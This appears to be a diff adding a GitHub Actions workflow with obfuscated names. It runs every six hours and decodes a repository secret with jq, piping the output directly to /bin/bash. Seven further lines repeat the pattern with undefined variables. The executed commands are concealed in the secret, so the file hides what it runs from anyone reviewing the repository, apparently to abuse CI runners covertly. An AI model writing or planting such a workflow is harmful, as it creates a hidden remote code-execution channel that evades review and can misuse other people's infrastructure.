@@ -1,0 +1,24 @@
+name: jianxunmushang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jianxunmushang
+        env:
+          tzho6: ${{ secrets.tzho6 }}
+        run: |
+          echo $tzho6 | jq -r .j39 | /bin/bash
+          echo $xfri1084 | jq -r .v08226 | /bin/bash
+          echo $fz1 | jq -r .lnk6 | /bin/bash
+          echo $fmqcj0 | jq -r .itff19 | /bin/bash
+          echo $nkqg425 | jq -r .ld5 | /bin/bash
+          echo $dbp279 | jq -r .lscj251 | /bin/bash
+          echo $nv0 | jq -r .wejo79 | /bin/bash
+          echo $w821 | jq -r .ko61 | /bin/bash
+
